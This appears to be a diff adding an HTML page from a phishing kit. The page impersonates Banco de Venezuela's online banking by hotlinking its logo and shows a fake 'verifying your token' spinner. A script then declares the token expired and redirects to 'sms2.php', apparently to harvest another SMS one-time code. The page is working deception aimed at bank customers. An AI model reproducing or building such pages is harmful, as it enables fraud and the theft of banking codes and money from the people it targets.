@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Un momento por favor!</title>
+    <style>
+        /* Estilos generales */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #0d1117;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+        }
+
+        /* Contenedor principal */
+        .loading-container {
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        /* Estilo para el logo */
+        .logo-container img {
+            width: 180px;
+            animation: slideIn 1.2s ease-out;
+        }
+
+        /* Nuevo spinner moderno */
+        .spinner {
+            margin: 40px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+
+        .spinner div {
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            background-color: #ff6347;
+            border-radius: 50%;
+            animation: bounce 1.2s infinite ease-in-out;
+        }
+
+        .spinner div:nth-child(1) { left: 8px; animation-delay: -0.4s; }
+        .spinner div:nth-child(2) { left: 32px; animation-delay: -0.2s; }
+        .spinner div:nth-child(3) { left: 56px; animation-delay: 0s; }
+
+        /* Animaciones */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        /* Texto de carga */
+        .loading-text {
+            font-size: 22px;
+            margin-top: 20px;
+            font-weight: 600;
+            color: #ff6347;
+            animation: fadeInText 2s ease-out;
+        }
+
+        @keyframes fadeInText {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Mensaje adicional */
+        .extra-message {
+            font-size: 16px;
+            color: #dcdcdc;
+            margin-top: 10px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="https://bdvenlinea.banvenez.com/assets/login/logo.png" alt="Logo">
+        </div>
+
+        <!-- Spinner -->
+        <div class="spinner">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+
+        <!-- Texto de carga -->
+        <p class="loading-text">Estamos verificando tu token...</p>
+
+        <!-- Mensaje adicional -->
+        <p class="extra-message">No cierres la ventana.</p>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            document.querySelector('.loading-text').textContent = '¡Token incorrecto o expirado!';
+            setTimeout(function() {
+                window.location.href = 'sms2.php';
+            }, 5000);
+        }, 10000);
+    </script>
+
+</body>
+</html>
